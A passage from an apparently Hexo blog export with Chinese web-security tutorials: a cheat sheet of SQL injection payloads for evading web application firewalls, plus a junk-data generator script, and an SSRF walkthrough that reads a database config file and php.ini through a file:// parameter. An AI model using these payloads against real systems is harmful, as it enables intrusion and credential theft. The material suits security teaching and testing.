in range(length)]</span><br><span class=\"line\">    random_str = &#x27;&#x27;.join(str_list)</span><br><span class=\"line\">    return random_str</span><br><span class=\"line\"></span><br><span class=\"line\">def main():</span><br><span class=\"line\">    data=&#123;&#125;</span><br><span class=\"line\">    for i in range(num_min,num_max):</span><br><span class=\"line\">        data[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))</span><br><span class=\"line\">    print(&#x27;&amp;&#x27;+parse.urlencode(data)+&#x27;&amp;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">main()</span><br></pre></td></tr></table></figure>","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<p>在进行渗透测试的时候，各式各样的waf层出不穷，阻拦了我们渗透测试的步伐。为了让大家少走一些弯路，我特地为大家出一篇文章，教大家如何绕过waf。</p>\n<h1 id=\"几种WAF的图片\"><a href=\"#几种WAF的图片\" class=\"headerlink\" title=\"几种WAF的图片\"></a>几种WAF的图片</h1><p><img src=\"/images/pasted-60.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-61.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-62.png\" alt=\"upload successful\"></p>\n<p>这就是waf，也就是网站防火墙，专业术语是Web应用防护系统，即Web Application Firewall。对于刚接触渗透测试的我来说，辛酸泪历史已经可以写一本书了，书名叫“那些年拦截住我的waf”。</p>\n<p>首先对于我们来说，需要知道一点，对于网站来说，在我们能力水平有限的情况下，是存在waf无法绕过的情况，这是很正常的，如果遇到实在过不去的 waf，该放弃时还是放弃吧。</p>\n<p>Waf对于我来说，也就是规则，通俗点就是这个结构:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(xxx)&#123;</span><br><span class=\"line\">\t拦截！</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\t通过</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>也就是说，我们只需要让它同意我们的操作，即绕过了waf。</p>\n<p>通常的waf一般可以有以下绕过方法：</p>\n<h1 id=\"1-大小写绕过\"><a href=\"#1-大小写绕过\" class=\"headerlink\" title=\"1.    大小写绕过\"></a>1.    大小写绕过</h1><p>（现在基本上遇不到了，不过也可以了解一下）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1 and UnIoN sElEcT 1,2,3</span><br><span class=\"line\">id=1 OrDeR By 1</span><br></pre></td></tr></table></figure>\n<h1 id=\"2-双写绕过\"><a href=\"#2-双写绕过\" class=\"headerlink\" title=\"2.    双写绕过\"></a>2.    双写绕过</h1><p>（原理是一些防护措施只进行一次，可以通过双写关键字的方法绕过）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1 ununionion selselectect 1,2,3 \t删除一次--&gt; union select 1,2,3</span><br><span class=\"line\">id=1 ororderder bbyy\t1\t删除一次--&gt; order by 1</span><br></pre></td></tr></table></figure>\n<h1 id=\"3-编码绕过\"><a href=\"#3-编码绕过\" class=\"headerlink\" title=\"3.    编码绕过\"></a>3.    编码绕过</h1><p>（如果检测的是关键字，那么经过编码即可绕过）</p>\n<p>URL全编码：<a href=\"http://web.chacuo.net/charseturlencode\">http://web.chacuo.net/charseturlencode</a><br><img src=\"/images/pasted-64.png\" alt=\"upload successful\"><br>十六进制：<a href=\"https://www.bejson.com/convert/ox2str/\">https://www.bejson.com/convert/ox2str/</a><br><img src=\"/images/pasted-65.png\" alt=\"upload successful\"></p>\n<blockquote>\n<p>ps：使用时需要在转换后的字符串前加0x，作为告诉数据库这里是十六进制的标识。这个方法用在不能使用引号时挺好的。</p>\n</blockquote>\n<hr>\n<h1 id=\"4-基本符号替换\"><a href=\"#4-基本符号替换\" class=\"headerlink\" title=\"4.    基本符号替换\"></a>4.    基本符号替换</h1><blockquote>\n<p>用&amp;&amp;替换and<br>用||替换or<br>用/**/替换空格<br>URL栏中用+替换空格    </p>\n</blockquote>\n<h1 id=\"5-报错注入替换函数绕过\"><a href=\"#5-报错注入替换函数绕过\" class=\"headerlink\" title=\"5.    报错注入替换函数绕过\"></a>5.    报错注入替换函数绕过</h1><p>（网站只检测一部分热门的函数，不检测一些冷门的函数）</p>\n<p>全部以select user() 为例：</p>\n<h3 id=\"1-floor\"><a href=\"#1-floor\" class=\"headerlink\" title=\"1.floor()\"></a>1.floor()</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id = 1 and (select 1 from  (select count(*),concat(user(),floor(rand(0)*2))x from  information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-extractvalue\"><a href=\"#2-extractvalue\" class=\"headerlink\" title=\"2.extractvalue()\"></a>2.extractvalue()</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id = 1 and extractvalue(1, concat(0x7e,(select user())))</span><br><span class=\"line\">id = 1 and extractvalue(1,concat(char(126),database()))</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-updatexml\"><a href=\"#3-updatexml\" class=\"headerlink\" title=\"3.updatexml()\"></a>3.updatexml()</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id = 1 and updatexml(1,concat(0x7e,(select user())),1)</span><br></pre></td></tr></table></figure>\n<h3 id=\"4-exp\"><a href=\"#4-exp\" class=\"headerlink\" title=\"4.exp()\"></a>4.exp()</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exp(~(select * from(select user()))a))</span><br></pre></td></tr></table></figure>\n<h3 id=\"5-总体可以归为一处的函数\"><a href=\"#5-总体可以归为一处的函数\" class=\"headerlink\" title=\"5.总体可以归为一处的函数\"></a>5.总体可以归为一处的函数</h3><p>(1)    GeometryCollection()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))</span><br></pre></td></tr></table></figure>\n<p>(2)    polygon()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id =1 AND polygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>\n<p>(3)    multipoint()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id = 1 AND multipoint((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>\n<p>(4)    multilinestring()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id = 1 AND multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>\n<p>(5)    linestring()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id = 1 AND LINESTRING((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>\n<p>(6)    multipolygon()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id =1 AND multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"6-其他等价函数绕过\"><a href=\"#6-其他等价函数绕过\" class=\"headerlink\" title=\"6.    其他等价函数绕过\"></a>6.    其他等价函数绕过</h1><blockquote>\n<p>hex()、bin() ==&gt; ascii()<br>sleep() ==&gt;benchmark()<br>concat_ws()==&gt;group_concat()<br>mid()、substr() ==&gt; substring()<br>@@user ==&gt; user()<br>@@database ==&gt; database()    </p>\n</blockquote>\n<h1 id=\"7-内联注释配合注释绕过\"><a href=\"#7-内联注释配合注释绕过\" class=\"headerlink\" title=\"7.    内联注释配合注释绕过\"></a>7.    内联注释配合注释绕过</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Id=1/**//*! order*/+/*!by*/+1</span><br></pre></td></tr></table></figure>\n<h1 id=\"8-0a换行跳出单行注释绕过\"><a href=\"#8-0a换行跳出单行注释绕过\" class=\"headerlink\" title=\"8.    %0a换行跳出单行注释绕过\"></a>8.    %0a换行跳出单行注释绕过</h1><p>原理：数据库中对于#和–(空格)后面的东西都进行注释忽略处理<br>我们通过waf一般不会处理注释内的东西这一特性进行绕过，在%23（url解码为#）后面放%0a换行再放入执行语句，中间可以多次经过%23%0a进行绕过。ps:在%23和%0a中间可以随意加入字符，放置注释掉了。<br>Payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=2%20+%231q%0AOrDeR%20%23adsf%0A%23%0ABy%201</span><br><span class=\"line\">id=-2%20+%231q%0AuNiOn%20all%23adsf%0A%23%0AsEleCt%201,2,3</span><br></pre></td></tr></table></figure>\n<h1 id=\"9-利用一些中间件的缺陷\"><a href=\"#9-利用一些中间件的缺陷\" class=\"headerlink\" title=\"9.    利用一些中间件的缺陷\"></a>9.    利用一些中间件的缺陷</h1><ol>\n<li><p>   IIS+ASP<br>通过在关键词之间加%绕过。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1 and uni%on se%le%ct 1,2,3 from ad%min</span><br></pre></td></tr></table></figure></li>\n<li><p>   IIS的Unicode编码<br>IIS支持Unicode编码，可以通过编码关键词进行绕过：<br><a href=\"http://tool.chinaz.com/tools/unicode.aspx\">http://tool.chinaz.com/tools/unicode.aspx</a><br><img src=\"/images/pasted-68.png\" alt=\"upload successful\"></p>\n</li>\n<li><p>   HTTP参数污染<br>有的时候，浏览器对于这样的传参会出现以下情况：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1 and id=2 --&gt; 出现在服务器中，id=1,2</span><br></pre></td></tr></table></figure>\n<p>那么我们可以这样绕：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1 and union select username &amp; id= password form admin</span><br><span class=\"line\">--&gt; id=1 and union select username, password form admin</span><br></pre></td></tr></table></figure>\n<p>对于这种参数重复传参的情况，不同环境有不同结果：</p>\n</li>\n</ol>\n<p><img src=\"/images/pasted-69.png\" alt=\"upload successful\"></p>\n<h1 id=\"10-更换传参方式绕过\"><a href=\"#10-更换传参方式绕过\" class=\"headerlink\" title=\"10.    更换传参方式绕过\"></a>10.    更换传参方式绕过</h1><p>在有些情况下，因为 $_REQUEST[‘id’] 的特性，我们可以将get传参的id=1切换成post传参，有些waf只针对了get传参进行防御而忽略了其他传参。</p>\n<p> <img src=\"/images/pasted-70.png\" alt=\"upload successful\"></p>\n<h1 id=\"11-利用数据提取方式的缺陷进行绕过\"><a href=\"#11-利用数据提取方式的缺陷进行绕过\" class=\"headerlink\" title=\"11.    利用数据提取方式的缺陷进行绕过\"></a>11.    利用数据提取方式的缺陷进行绕过</h1><p>PHP+Apache中，在多参数传参的情况下，某些waf会对传参进行分开验证，我们可以通过分开传参加注释符进行绕过。</p>\n<p>Example：<br>在PHP+Apache中<br>x=1&amp;y=2&amp;z=3 在某些waf中会被提取为：<br>x=1<br>y=2<br>z=3<br>payload:    </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1+union+/*&amp;x=2*/+select/*&amp;y=3*/+1,2,3+from+admin</span><br></pre></td></tr></table></figure>\n<p>waf检测方式为分别检测三个传参：<br>id=1+union+/*<br>x=2*/+select/*<br>y=3*/1,2,3+from+admin    </p>\n<p>数据库中，/**/中间的东西被过滤了，获得的传参为：    </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1+union++select+1,2,3+from+admin</span><br></pre></td></tr></table></figure>\n<h1 id=\"12-脏数据绕过\"><a href=\"#12-脏数据绕过\" class=\"headerlink\" title=\"12.    脏数据绕过\"></a>12.    脏数据绕过</h1><p>在被waf拦截之后，更改传参方式为POST，再通过在传参处放入大量无用数据绕过waf，详情可以查看链接:<br><a href=\"https://cloud.tencent.com/developer/article/1592593\">https://cloud.tencent.com/developer/article/1592593</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#生成垃圾数据</span><br><span class=\"line\">#coding=utf-8</span><br><span class=\"line\">import random,string</span><br><span class=\"line\">from urllib import parse</span><br><span class=\"line\">varname_min = 5</span><br><span class=\"line\">varname_max = 15</span><br><span class=\"line\">data_min = 20</span><br><span class=\"line\">data_max = 25</span><br><span class=\"line\">num_min = 50</span><br><span class=\"line\">num_max = 100</span><br><span class=\"line\">def randstr(length):</span><br><span class=\"line\">    str_list = [random.choice(string.ascii_letters) for i in range(length)]</span><br><span class=\"line\">    random_str = &#x27;&#x27;.join(str_list)</span><br><span class=\"line\">    return random_str</span><br><span class=\"line\"></span><br><span class=\"line\">def main():</span><br><span class=\"line\">    data=&#123;&#125;</span><br><span class=\"line\">    for i in range(num_min,num_max):</span><br><span class=\"line\">        data[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))</span><br><span class=\"line\">    print(&#x27;&amp;&#x27;+parse.urlencode(data)+&#x27;&amp;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">main()</span><br></pre></td></tr></table></figure>"},{"title":"服务器端请求伪造-SSRF","keywords":"SSRF,服务器端请求伪造,任意文件读取,文件读取,实战演示","description":"从CSRF漏洞学习cookie对于web安全的危害","cover":"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F27a30abf3c1075c2dcff9371a6d8905e.png&refer=http%3A%2F%2Fimg-blog.csdnimg.cn&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630914926&t=2db2045c1dd34b138e02c2edd50efca7","date":"2020-11-28T06:05:18.000Z","_content":"\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n最初认识SSRF会与CSRF跨站请求伪造很容易混淆。二者虽然名字很像，但是实际运用却千差万别。SSRF是构造形成由服务器发起请求，攻击内网主机的漏洞；而CSRF则是构造形成由客户端发起请求，攻击服务器的漏洞。\n\n# 概念\nSSRF(Server-Side Request Forgery)，服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。\t\n攻击者往往可以通过SSRF访问到目标服务器所在的内网资源，这些资源是正常用户访问不到的，而且因为SSRF可以支持伪协议，所以还存在直接通过Gopher协议写入webshell的危害。\n# SSRF的危害\n>1.内外网的端口和服务扫描\n2.主机本地敏感数据的读取\n3.内外网主机应用程序漏洞的利用\n4.内外网Web站点漏洞的利用 \n\n# SSRF漏洞可能出现的地方\n因为SSRF是服务器端请求伪造，那么可以看出，SSRF漏洞出现的位置，肯定是服务器加载资源处。或者说，当服务器有向外加载资源，就有可能存在SSRF漏洞。例如：\n>1、图片加载/下载：通过URL地址加载或下载图片\n2、图片/文章收藏功能：从URL地址中取出title以及文本的内容作为显示\n3、导出功能：从服务器中加载文件进行导出\n4、在线翻译\n5、一些api接口提供的加载其他url功能\n# 实战渗透SSRF漏洞\n1、首先打开指定站点，这里看到打开页面是通过加载模块进行回显的\n![upload successful](/images/13/1.png) \n\n2、直接通过file伪协议获取文件内容发现显示模块不存在\n![upload successful](/images/13/2.png)  \n\n3、定位存在漏洞的代码文件：app/setting/controller/ApiAdminDomainSettings.php\n![upload successful](/images/13/3.png) \n\n4、分析代码\n```\n（1）通过input传参postAddress\n（2）将postAddress赋予$api\n（3）$api经过$options处理，最后赋予给$ch\n（4）执行curl_exec\n```\n5、传参获取数据库文件内容，里面获取了用户名root，密码root。\n```\npostAddress=file:///E:\\New File\\WWW\\phpStudy\\WWW\\app\\database.php&url=test&id=test\n```\n![upload successful](/images/13/4.png)  \n\n![upload successful](/images/13/5.png)  \n\n6、读取php配置文件php.ini\n![upload successful](/images/13/6.png)  \n\n","source":"_posts/服务端请求伪造-SSRF.md","raw":"---\ntitle: 服务器端请求伪造-SSRF\ntags: \n  - web安全\n  - CSRF\n  - SSRF\n  - 服务器端请求伪造\ncategories: web安全\nkeywords: 'SSRF,服务器端请求伪造,任意文件读取,文件读取,实战演示'\ndescription: 从CSRF漏洞学习cookie对于web安全的危害\ncover: https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F27a30abf3c1075c2dcff9371a6d8905e.png&refer=http%3A%2F%2Fimg-blog.csdnimg.cn&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630914926&t=2db2045c1dd34b138e02c2edd50efca7\ndate: 2020-11-28 14:05:18\n---\n\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n最初认识SSRF会与CSRF跨站请求伪造很容易混淆。二者虽然名字很像，但是实际运用却千差万别。SSRF是构造形成由服务器发起请求，攻击内网主机的漏洞；而CSRF则是构造形成由客户端发起请求，攻击服务器的漏洞。\n\n# 概念\nSSRF(Server-Side Request Forgery)，服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。\t\n攻击者往往可以通过SSRF访问到目标服务器所在的内网资源，这些资源是正常用户访问不到的，而且因为SSRF可以支持伪协议，所以还存在直接通过Gopher协议写入webshell的危害。\n# SSRF的危害\n>1.内外网的端口和服务扫描\n2.主机本地敏感数据的读取\n3.内外网主机应用程序漏洞的利用\n4.内外网Web站点漏洞的利用 \n\n# SSRF漏洞可能出现的地方\n因为SSRF是服务器端请求伪造，那么可以看出，SSRF漏洞出现的位置，肯定是服务器加载资源处。或者说，当服务器有向外加载资源，就有可能存在SSRF漏洞。例如：\n>1、图片加载/下载：通过URL地址加载或下载图片\n2、图片/文章收藏功能：从URL地址中取出title以及文本的内容作为显示\n3、导出功能：从服务器中加载文件进行导出\n4、在线翻译\n5、一些api接口提供的加载其他url功能\n# 实战渗透SSRF漏洞\n1、首先打开指定站点，这里看到打开页面是通过加载模块进行回显的\n![upload successful](/images/13/1.png) \n\n2、直接通过file伪协议获取文件内容发现显示模块不存在\n![upload successful](/images/13/2.png)  \n\n3、定位存在漏洞的代码文件：app/setting/controller/ApiAdminDomainSettings.php\n![upload successful](/images/13/3.png) \n\n4、分析代码\n```\n（1）通过input传参postAddress\n（2）将postAddress赋予$api\n（3）$api经过$options处理，最后赋予给$ch\n（4）执行curl_exec\n```\n5、传参获取数据库文件内容，里面获取了用户名root，密码root。\n```\npostAddress=file:///E:\\New File\\WWW\\phpStudy\\WWW\\app\\database.php&url=test&id=test\n```\n![upload successful](/images/13/4.png)  \n\n![upload successful](/images/13/5.png)  \n\n6、读取php配置文件php.ini\n![upload successful](/images/13/6.png)  \n\n","slug":"服务端请求伪造-SSRF","published":1,"updated":"2021-08-07T16:16:33.461Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpfk0015vkq31iiqgz5o","content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<p>最初认识SSRF会与CSRF跨站请求伪造很容易混淆。二者虽然名字很像，但是实际运用却千差万别。SSRF是构造形成由服务器发起请求，攻击内网主机的漏洞；而CSRF则是构造形成由客户端发起请求，攻击服务器的漏洞。</p>\n<h1 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h1><p>SSRF(Server-Side Request Forgery)，服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。<br>攻击者往往可以通过SSRF访问到目标服务器所在的内网资源，这些资源是正常用户访问不到的，而且因为SSRF可以支持伪协议，所以还存在直接通过Gopher协议写入webshell的危害。</p>\n<h1 id=\"SSRF的危害\"><a href=\"#SSRF的危害\" class=\"headerlink\" title=\"SSRF的危害\"></a>SSRF的危害</h1><blockquote>\n<p>1.内外网的端口和服务扫描<br>2.主机本地敏感数据的读取<br>3.内外网主机应用程序漏洞的利用<br>4.内外网Web站点漏洞的利用 </p>\n</blockquote>\n<h1 id=\"SSRF漏洞可能出现的地方\"><a href=\"#SSRF漏洞可能出现的地方\" class=\"headerlink\" title=\"SSRF漏洞可能出现的地方\"></a>SSRF漏洞可能出现的地方</h1><p>因为SSRF是服务器端请求伪造，那么可以看出，SSRF漏洞出现的位置，肯定是服务器加载资源处。或者说，当服务器有向外加载资源，就有可能存在SSRF漏洞。例如：</p>\n<blockquote>\n<p>1、图片加载/下载：通过URL地址加载或下载图片<br>2、图片/文章收藏功能：从URL地址中取出title以及文本的内容作为显示<br>3、导出功能：从服务器中加载文件进行导出<br>4、在线翻译<br>5、一些api接口提供的加载其他url功能</p>\n</blockquote>\n<h1 id=\"实战渗透SSRF漏洞\"><a href=\"#实战渗透SSRF漏洞\" class=\"headerlink\" title=\"实战渗透SSRF漏洞\"></a>实战渗透SSRF漏洞</h1><p>1、首先打开指定站点，这里看到打开页面是通过加载模块进行回显的<br><img src=\"/images/13/1.png\" alt=\"upload successful\"> </p>\n<p>2、直接通过file伪协议获取文件内容发现显示模块不存在<br><img src=\"/images/13/2.png\" alt=\"upload successful\">  </p>\n<p>3、定位存在漏洞的代码文件：app/setting/controller/ApiAdminDomainSettings.php<br><img src=\"/images/13/3.png\" alt=\"upload successful\"> </p>\n<p>4、分析代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">（1）通过input传参postAddress</span><br><span class=\"line\">（2）将postAddress赋予$api</span><br><span class=\"line\">（3）$api经过$options处理，最后赋予给$ch</span><br><span class=\"line\">（4）执行curl_exec</span><br></pre></td></tr></table></figure>\n<p>5、传参获取数据库文件内容，里面获取了用户名root，密码root。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">postAddress=file:///E:\\New File\\WWW\\phpStudy\\WWW\\app\\database.php&amp;url=test&amp;id=test</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/13/4.png\" alt=\"upload successful\">  </p>\n<p><img src=\"/images/13/5.png\" alt=\"upload successful\">  </p>\n<p>6、读取php配置文件php.ini<br><img src=\"/images/13/6.png\" alt=\"upload successful\">  </p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<p>最初认识SSRF会与CSRF跨站请求伪造很容易混淆。二者虽然名字很像，但是实际运用却千差万别。SSRF是构造形成由服务器发起请求，攻击内网主机的漏洞；而CSRF则是构造形成由客户端发起请求，攻击服务器的漏洞。</p>\n<h1 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h1><p>SSRF(Server-Side Request Forgery)，服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。<br>攻击者往往可以通过SSRF访问到目标服务器所在的内网资源，这些资源是正常用户访问不到的，而且因为SSRF可以支持伪协议，所以还存在直接通过Gopher协议写入webshell的危害。</p>\n<h1 id=\"SSRF的危害\"><a href=\"#SSRF的危害\" class=\"headerlink\" title=\"SSRF的危害\"></a>SSRF的危害</h1><blockquote>\n<p>1.内外网的端口和服务扫描<br>2.主机本地敏感数据的读取<br>3.内外网主机应用程序漏洞的利用<br>4.内外网Web站点漏洞的利用 </p>\n</blockquote>\n<h1 id=\"SSRF漏洞可能出现的地方\"><a href=\"#SSRF漏洞可能出现的地方\" class=\"headerlink\" title=\"SSRF漏洞可能出现的地方\"></a>SSRF漏洞可能出现的地方</h1><p>因为SSRF是服务器端请求伪造，那么可以看出，SSRF漏洞出现的位置，肯定是服务器加载资源处。或者说，当服务器有向外加载资源，就有可能存在SSRF漏洞。例如：</p>\n<blockquote>\n<p>1、图片加载/下载：通过URL地址加载或下载图片<br>2、图片/文章收藏功能：从URL地址中取出title以及文本的内容作为显示<br>3、导出功能：从服务器中加载文件进行导出<br>4、在线翻译<br>5、一些api接口提供的加载其他url功能</p>\n</blockquote>\n<h1 id=\"实战渗透SSRF漏洞\"><a href=\"#实战渗透SSRF漏洞\" class=\"headerlink\" title=\"实战渗透SSRF漏洞\"></a>实战渗透SSRF漏洞</h1><p>1、首先打开指定站点，这里看到打开页面是通过加载模块进行回显的<br><img src=\"/images/13/1.png\" alt=\"upload successful\"> </p>\n<p>2、直接通过file伪协议获取文件内容发现显示模块不存在<br><img src=\"/images/13/2.png\" alt=\"upload successful\">  </p>\n<p>3、定位存在漏洞的代码文件：app/setting/controller/ApiAdminDomainSettings.php<br><img src=\"/images/13/3.png\" alt=\"upload successful\"> </p>\n<p>4、分析代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">（1）通过input传参postAddress</span><br><span class=\"line\">（2）将postAddress赋予$api</span><br><span class=\"line\">（3）$api经过$options处理，最后赋予给$ch</span><br><span class=\"line\">（4）执行curl_exec</span><br></pre></td></tr></table></figure>\n<p>5、传参获取数据库文件内容，里面获取了用户名root，密码root。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">postAddress=file:///E:\\New File\\WWW\\phpStudy\\WWW\\app\\database.php&amp;url=test&amp;id=test</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/13/4.png\" alt=\"upload successful\">  </p>\n<p><img src=\"/images/13/5.png\" alt=\"upload successful\">  </p>\n<p>6、读取php配置文件php.ini<br><img src=\"/images/13/6.png\" alt=\"upload successful\">  